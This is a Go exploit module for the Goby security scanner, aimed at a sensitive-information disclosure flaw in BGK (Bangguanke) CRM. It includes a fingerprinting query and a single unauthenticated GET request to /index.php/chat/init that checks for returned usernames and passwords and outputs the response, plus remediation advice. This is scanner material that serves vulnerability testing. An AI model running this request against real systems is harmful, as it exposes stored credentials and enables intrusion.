package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "BGK CRM Sensitive Information Disclosure Vulnerability",
    "Description": "<p>BGK CRM is a customer management system that integrates customer files, sales records, business contacts and other functions.</p><p>There is a sensitive information leakage vulnerability in the BGK CRM. Attackers can read sensitive system information by constructing a special URL address.</p>",
    "Product": "BANGGUANKE-CRM",
    "Homepage": "https://www.bgkcrm.com/",
    "DisclosureDate": "2023-08-01",
    "PostTime": "2023-08-01",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"/themes/default/css/llq.css\"",
    "GobyQuery": "body=\"/themes/default/css/llq.css\"",
    "Level": "3",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/chat/init",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":0",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userpwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/chat/init",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":0",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userpwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "帮管客 CRM 敏感信息泄露漏洞",
            "Product": "帮管客-CRM",
            "Description": "<p>帮管客 CRM 是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。</p><p>帮管客 CRM 存在敏感信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>帮管客 CRM 存在敏感信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "BGK CRM Sensitive Information Disclosure Vulnerability",
            "Product": "BANGGUANKE-CRM",
            "Description": "<p>BGK CRM is a customer management system that integrates customer files, sales records, business contacts and other functions.</p><p>There is a sensitive information leakage vulnerability in the BGK CRM. Attackers can read sensitive system information by constructing a special URL address.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10812"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

